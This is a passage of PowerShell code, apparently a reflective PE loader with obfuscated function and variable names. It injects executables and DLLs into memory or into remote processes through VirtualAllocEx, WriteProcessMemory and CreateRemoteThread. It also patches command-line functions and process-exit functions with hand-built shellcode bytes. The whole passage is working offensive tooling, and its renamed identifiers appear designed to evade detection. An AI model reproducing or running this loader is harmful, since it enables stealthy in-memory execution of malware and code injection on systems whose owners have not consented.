			$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($MmVEuNti99, $TGyydnHP99, $VGDFPqWv99, [Ref]$xgrvTZjv99)
			if ($GBrhDMbN99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function increasing
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$zTIoWIPC99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$uPLeHXWJ99
		)
		
		$nllHFFpP99 = @() 
		
		$sxlJVNvv99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$xgrvTZjv99 = 0
		
		[IntPtr]$wByIWjwr99 = $HDWlOjKv99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($wByIWjwr99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$LZmzxUCc99 = $HDWlOjKv99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($LZmzxUCc99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$tOSiaxKX99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($zTIoWIPC99)
		$iSBMoAmo99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($zTIoWIPC99)
	
		[IntPtr]$gSqIQpwU99 = $HDWlOjKv99.GetProcAddress.Invoke($LZmzxUCc99, "GetCommandLineA")
		[IntPtr]$NGJNCfcZ99 = $HDWlOjKv99.GetProcAddress.Invoke($LZmzxUCc99, "GetCommandLineW")
		if ($gSqIQpwU99 -eq [IntPtr]::Zero -or $NGJNCfcZ99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $gSqIQpwU99. GetCommandLineW: $NGJNCfcZ99"
		}
		[Byte[]]$aXVCqKEP99 = @()
		if ($sxlJVNvv99 -eq 8)
		{
			$aXVCqKEP99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$aXVCqKEP99 += 0xb8
		
		[Byte[]]$WSbOUHYF99 = @(0xc3)
		$vhyTIiFo99 = $aXVCqKEP99.Length + $sxlJVNvv99 + $WSbOUHYF99.Length
		
		
		$quREjnkQ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vhyTIiFo99)
		$wdRPhPsc99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vhyTIiFo99)
		$HDWlOjKv99.memcpy.Invoke($quREjnkQ99, $gSqIQpwU99, [UInt64]$vhyTIiFo99) | Out-Null
		$HDWlOjKv99.memcpy.Invoke($wdRPhPsc99, $NGJNCfcZ99, [UInt64]$vhyTIiFo99) | Out-Null
		$nllHFFpP99 += ,($gSqIQpwU99, $quREjnkQ99, $vhyTIiFo99)
		$nllHFFpP99 += ,($NGJNCfcZ99, $wdRPhPsc99, $vhyTIiFo99)
		[UInt32]$xgrvTZjv99 = 0
		$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($gSqIQpwU99, [UInt32]$vhyTIiFo99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$xgrvTZjv99)
		if ($GBrhDMbN99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$gFUTmFMV99 = $gSqIQpwU99
		uninteresting -Bytes $aXVCqKEP99 -xOESEpLd99 $gFUTmFMV99
		$gFUTmFMV99 = sane $gFUTmFMV99 ($aXVCqKEP99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($iSBMoAmo99, $gFUTmFMV99, $false)
		$gFUTmFMV99 = sane $gFUTmFMV99 $sxlJVNvv99
		uninteresting -Bytes $WSbOUHYF99 -xOESEpLd99 $gFUTmFMV99
		
		$HDWlOjKv99.VirtualProtect.Invoke($gSqIQpwU99, [UInt32]$vhyTIiFo99, [UInt32]$xgrvTZjv99, [Ref]$xgrvTZjv99) | Out-Null
		
		
		[UInt32]$xgrvTZjv99 = 0
		$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($NGJNCfcZ99, [UInt32]$vhyTIiFo99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$xgrvTZjv99)
		if ($GBrhDMbN99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$xHMVuGAF99 = $NGJNCfcZ99
		uninteresting -Bytes $aXVCqKEP99 -xOESEpLd99 $xHMVuGAF99
		$xHMVuGAF99 = sane $xHMVuGAF99 ($aXVCqKEP99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($tOSiaxKX99, $xHMVuGAF99, $false)
		$xHMVuGAF99 = sane $xHMVuGAF99 $sxlJVNvv99
		uninteresting -Bytes $WSbOUHYF99 -xOESEpLd99 $xHMVuGAF99
		
		$HDWlOjKv99.VirtualProtect.Invoke($NGJNCfcZ99, [UInt32]$vhyTIiFo99, [UInt32]$xgrvTZjv99, [Ref]$xgrvTZjv99) | Out-Null
		
		
		$wiEFADQe99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $wiEFADQe99)
		{
			[IntPtr]$cSgciucT99 = $HDWlOjKv99.GetModuleHandle.Invoke($Dll)
			if ($cSgciucT99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$eoFiOjbJ99 = $HDWlOjKv99.GetProcAddress.Invoke($cSgciucT99, "_wcmdln")
				[IntPtr]$rGaGaAla99 = $HDWlOjKv99.GetProcAddress.Invoke($cSgciucT99, "_acmdln")
				if ($eoFiOjbJ99 -eq [IntPtr]::Zero -or $rGaGaAla99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$cfVQqQpp99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($zTIoWIPC99)
				$ZmKpdyOM99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($zTIoWIPC99)
				
				$iuMQfKdv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rGaGaAla99, [Type][IntPtr])
				$DfcNXdQE99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($eoFiOjbJ99, [Type][IntPtr])
				$Pqwucaoh99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sxlJVNvv99)
				$ueUBPTLS99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sxlJVNvv99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($iuMQfKdv99, $Pqwucaoh99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DfcNXdQE99, $ueUBPTLS99, $false)
				$nllHFFpP99 += ,($rGaGaAla99, $Pqwucaoh99, $sxlJVNvv99)
				$nllHFFpP99 += ,($eoFiOjbJ99, $ueUBPTLS99, $sxlJVNvv99)
				
				$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($rGaGaAla99, [UInt32]$sxlJVNvv99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$xgrvTZjv99)
				if ($GBrhDMbN99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($cfVQqQpp99, $rGaGaAla99, $false)
				$HDWlOjKv99.VirtualProtect.Invoke($rGaGaAla99, [UInt32]$sxlJVNvv99, [UInt32]($xgrvTZjv99), [Ref]$xgrvTZjv99) | Out-Null
				
				$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($eoFiOjbJ99, [UInt32]$sxlJVNvv99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$xgrvTZjv99)
				if ($GBrhDMbN99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($ZmKpdyOM99, $eoFiOjbJ99, $false)
				$HDWlOjKv99.VirtualProtect.Invoke($eoFiOjbJ99, [UInt32]$sxlJVNvv99, [UInt32]($xgrvTZjv99), [Ref]$xgrvTZjv99) | Out-Null
			}
		}
		
		
		$nllHFFpP99 = @()
		$OryniBEQ99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$QzpEgXbz99 = $HDWlOjKv99.GetModuleHandle.Invoke("mscoree.dll")
		if ($QzpEgXbz99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$QAaXlWgB99 = $HDWlOjKv99.GetProcAddress.Invoke($QzpEgXbz99, "CorExitProcess")
		if ($QAaXlWgB99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$OryniBEQ99 += $QAaXlWgB99
		
		[IntPtr]$rGaJJlbb99 = $HDWlOjKv99.GetProcAddress.Invoke($wByIWjwr99, "ExitProcess")
		if ($rGaJJlbb99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$OryniBEQ99 += $rGaJJlbb99
		
		[UInt32]$xgrvTZjv99 = 0
		foreach ($gmgNeKkm99 in $OryniBEQ99)
		{
			$BRnhhjBK99 = $gmgNeKkm99
			[Byte[]]$aXVCqKEP99 = @(0xbb)
			[Byte[]]$WSbOUHYF99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($sxlJVNvv99 -eq 8)
			{
				[Byte[]]$aXVCqKEP99 = @(0x48, 0xbb)
				[Byte[]]$WSbOUHYF99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$lDEKEHGN99 = @(0xff, 0xd3)
			$vhyTIiFo99 = $aXVCqKEP99.Length + $sxlJVNvv99 + $WSbOUHYF99.Length + $sxlJVNvv99 + $lDEKEHGN99.Length
			
			[IntPtr]$BiOlRKdW99 = $HDWlOjKv99.GetProcAddress.Invoke($wByIWjwr99, "ExitThread")
			if ($BiOlRKdW99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($gmgNeKkm99, [UInt32]$vhyTIiFo99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$xgrvTZjv99)
			if ($GBrhDMbN99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$UWXhyAkT99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vhyTIiFo99)
			$HDWlOjKv99.memcpy.Invoke($UWXhyAkT99, $gmgNeKkm99, [UInt64]$vhyTIiFo99) | Out-Null
			$nllHFFpP99 += ,($gmgNeKkm99, $UWXhyAkT99, $vhyTIiFo99)
			
			uninteresting -Bytes $aXVCqKEP99 -xOESEpLd99 $BRnhhjBK99
			$BRnhhjBK99 = sane $BRnhhjBK99 ($aXVCqKEP99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($uPLeHXWJ99, $BRnhhjBK99, $false)
			$BRnhhjBK99 = sane $BRnhhjBK99 $sxlJVNvv99
			uninteresting -Bytes $WSbOUHYF99 -xOESEpLd99 $BRnhhjBK99
			$BRnhhjBK99 = sane $BRnhhjBK99 ($WSbOUHYF99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($BiOlRKdW99, $BRnhhjBK99, $false)
			$BRnhhjBK99 = sane $BRnhhjBK99 $sxlJVNvv99
			uninteresting -Bytes $lDEKEHGN99 -xOESEpLd99 $BRnhhjBK99
			$HDWlOjKv99.VirtualProtect.Invoke($gmgNeKkm99, [UInt32]$vhyTIiFo99, [UInt32]$xgrvTZjv99, [Ref]$xgrvTZjv99) | Out-Null
		}
		Write-Output $nllHFFpP99
	}
	
	
	Function Odessa
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$GTUCNyjJ99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$xgrvTZjv99 = 0
		foreach ($Info in $GTUCNyjJ99)
		{
			$GBrhDMbN99 = $HDWlOjKv99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$xgrvTZjv99)
			if ($GBrhDMbN99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$HDWlOjKv99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$HDWlOjKv99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$xgrvTZjv99, [Ref]$xgrvTZjv99) | Out-Null
		}
	}
	Function fillet
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$egdOmrAe99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$LJGBrAPz99 = Platonism
		$Win32Constants = recommenced
		$PEInfo = backslid -egdOmrAe99 $egdOmrAe99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$rawxUKrJ99 = sane ($egdOmrAe99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$wrqHjxcb99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rawxUKrJ99, [Type]$LJGBrAPz99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $wrqHjxcb99.NumberOfNames; $i++)
		{
			$txZnTZpv99 = sane ($egdOmrAe99) ($wrqHjxcb99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$efdgAXkF99 = sane ($egdOmrAe99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($txZnTZpv99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($efdgAXkF99)
			if ($Name -ceq $FunctionName)
			{
				$ccVufkDw99 = sane ($egdOmrAe99) ($wrqHjxcb99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$dkuFnKFO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ccVufkDw99, [Type][UInt16])
				$RknnzKRl99 = sane ($egdOmrAe99) ($wrqHjxcb99.AddressOfFunctions + ($dkuFnKFO99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$AToySDNy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RknnzKRl99, [Type][UInt32])
				return sane ($egdOmrAe99) ($AToySDNy99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function Qom
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$GPmJoDbZ99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ucmYvWRU99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$MVHuzxUH99
		)
		
		$sxlJVNvv99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = recommenced
		$HDWlOjKv99 = sneaks
		$LJGBrAPz99 = Platonism
		
		$KiTwYyuX99 = $false
		if (($MVHuzxUH99 -ne $null) -and ($MVHuzxUH99 -ne [IntPtr]::Zero))
		{
			$KiTwYyuX99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = backslidden -GPmJoDbZ99 $GPmJoDbZ99 -LJGBrAPz99 $LJGBrAPz99
		$PvcZTBPG99 = $PEInfo.OriginalImageBase
		$SOJvILMX99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$SOJvILMX99 = $false
		}
		
		
		$tRkdjofH99 = $true
		if ($KiTwYyuX99 -eq $true)
		{
			$wByIWjwr99 = $HDWlOjKv99.GetModuleHandle.Invoke("kernel32.dll")
			$RdmPlRRb99 = $HDWlOjKv99.GetProcAddress.Invoke($wByIWjwr99, "IsWow64Process")
			if ($RdmPlRRb99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$THbTjaHT99 = $false
			$GBrhDMbN99 = $HDWlOjKv99.IsWow64Process.Invoke($MVHuzxUH99, [Ref]$THbTjaHT99)
			if ($GBrhDMbN99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($THbTjaHT99 -eq $true) -or (($THbTjaHT99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$tRkdjofH99 = $false
			}
			
			$mHybPbnZ99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$mHybPbnZ99 = $false
			}
			if ($mHybPbnZ99 -ne $tRkdjofH99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$tRkdjofH99 = $false
			}
		}
		if ($tRkdjofH99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$AFANLFDH99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$AFANLFDH99 = $PvcZTBPG99
		}
		$egdOmrAe99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$SYsDSXnE99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $egdOmrAe99. If it is loaded in a remote process, this is the address in the remote process.
		if ($KiTwYyuX99 -eq $true)
		{
			$egdOmrAe99 = $HDWlOjKv99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$SYsDSXnE99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, $AFANLFDH99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($SYsDSXnE99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($SOJvILMX99 -eq $true)
			{
				$egdOmrAe99 = $HDWlOjKv99.VirtualAlloc.Invoke($AFANLFDH99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$egdOmrAe99 = $HDWlOjKv99.VirtualAlloc.Invoke($AFANLFDH99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$SYsDSXnE99 = $egdOmrAe99
		}
		
		[IntPtr]$ikDilHpd99 = sane ($egdOmrAe99) ([Int64]$PEInfo.SizeOfImage)
		if ($egdOmrAe99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($GPmJoDbZ99, 0, $egdOmrAe99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = backslid -egdOmrAe99 $egdOmrAe99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $ikDilHpd99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $SYsDSXnE99
		Write-Verbose "StartAddress: $egdOmrAe99    EndAddress: $ikDilHpd99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		Saussure -GPmJoDbZ99 $GPmJoDbZ99 -PEInfo $PEInfo -HDWlOjKv99 $HDWlOjKv99 -LJGBrAPz99 $LJGBrAPz99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Popper -PEInfo $PEInfo -PvcZTBPG99 $PvcZTBPG99 -Win32Constants $Win32Constants -LJGBrAPz99 $LJGBrAPz99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($KiTwYyuX99 -eq $true)
		{
			restful -PEInfo $PEInfo -HDWlOjKv99 $HDWlOjKv99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants -MVHuzxUH99 $MVHuzxUH99
		}
		else
		{
			restful -PEInfo $PEInfo -HDWlOjKv99 $HDWlOjKv99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants
		}
		
		
		if ($KiTwYyuX99 -eq $false)
		{
			if ($SOJvILMX99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				awkwardness -PEInfo $PEInfo -HDWlOjKv99 $HDWlOjKv99 -Win32Constants $Win32Constants -LJGBrAPz99 $LJGBrAPz99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($KiTwYyuX99 -eq $true)
		{
			[UInt32]$IbYSYUiw99 = 0
			$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $SYsDSXnE99, $egdOmrAe99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$IbYSYUiw99)
			if ($GBrhDMbN99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($KiTwYyuX99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$YruxLFWI99 = sane ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$syWGwpsh99 = serpent @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$ufMaWkAl99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YruxLFWI99, $syWGwpsh99)
				
				$ufMaWkAl99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$YruxLFWI99 = sane ($SYsDSXnE99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$rchoyDhJ99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$daxXnqsO99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$HgkZpWja99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$rchoyDhJ99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$daxXnqsO99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$HgkZpWja99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$dOUUBGSF99 = $rchoyDhJ99.Length + $daxXnqsO99.Length + $HgkZpWja99.Length + ($sxlJVNvv99 * 2)
				$JLEzydEF99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dOUUBGSF99)
				$hqEXhEBt99 = $JLEzydEF99
				
				uninteresting -Bytes $rchoyDhJ99 -xOESEpLd99 $JLEzydEF99
				$JLEzydEF99 = sane $JLEzydEF99 ($rchoyDhJ99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($SYsDSXnE99, $JLEzydEF99, $false)
				$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
				uninteresting -Bytes $daxXnqsO99 -xOESEpLd99 $JLEzydEF99
				$JLEzydEF99 = sane $JLEzydEF99 ($daxXnqsO99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($YruxLFWI99, $JLEzydEF99, $false)
				$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
				uninteresting -Bytes $HgkZpWja99 -xOESEpLd99 $JLEzydEF99
				$JLEzydEF99 = sane $JLEzydEF99 ($HgkZpWja99.Length)
				
				$UOYTtWGG99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, [UIntPtr][UInt64]$dOUUBGSF99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($UOYTtWGG99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $UOYTtWGG99, $hqEXhEBt99, [UIntPtr][UInt64]$dOUUBGSF99, [Ref]$IbYSYUiw99)
				if (($GBrhDMbN99 -eq $false) -or ([UInt64]$IbYSYUiw99 -ne [UInt64]$dOUUBGSF99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$MeyTOpXT99 = braziers -qXvylkCO99 $MVHuzxUH99 -StartAddress $UOYTtWGG99 -HDWlOjKv99 $HDWlOjKv99
				$RdmPlRRb99 = $HDWlOjKv99.WaitForSingleObject.Invoke($MeyTOpXT99, 20000)
				if ($RdmPlRRb99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $UOYTtWGG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$uPLeHXWJ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($uPLeHXWJ99, 0, 0x00)
			$LwVbZisk99 = increasing -PEInfo $PEInfo -HDWlOjKv99 $HDWlOjKv99 -Win32Constants $Win32Constants -zTIoWIPC99 $ucmYvWRU99 -uPLeHXWJ99 $uPLeHXWJ99
			[IntPtr]$HYPwxPWh99 = sane ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $HYPwxPWh99. Creating thread for the EXE to run in."
			$HDWlOjKv99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $HYPwxPWh99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$SVxIWAPf99 = [System.Runtime.InteropServices.Marshal]::ReadByte($uPLeHXWJ99, 0)
				if ($SVxIWAPf99 -eq 1)
				{
					Odessa -GTUCNyjJ99 $LwVbZisk99 -HDWlOjKv99 $HDWlOjKv99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $SYsDSXnE99)
	}
	
	
	Function genii
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$egdOmrAe99
		)
		
		$Win32Constants = recommenced
		$HDWlOjKv99 = sneaks
		$LJGBrAPz99 = Platonism
		
		$PEInfo = backslid -egdOmrAe99 $egdOmrAe99 -LJGBrAPz99 $LJGBrAPz99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$xuiqRfpr99 = sane ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ZhCSxMvd99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xuiqRfpr99, [Type]$LJGBrAPz99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($ZhCSxMvd99.Characteristics -eq 0 `
						-and $ZhCSxMvd99.FirstThunk -eq 0 `
						-and $ZhCSxMvd99.ForwarderChain -eq 0 `
						-and $ZhCSxMvd99.Name -eq 0 `
						-and $ZhCSxMvd99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
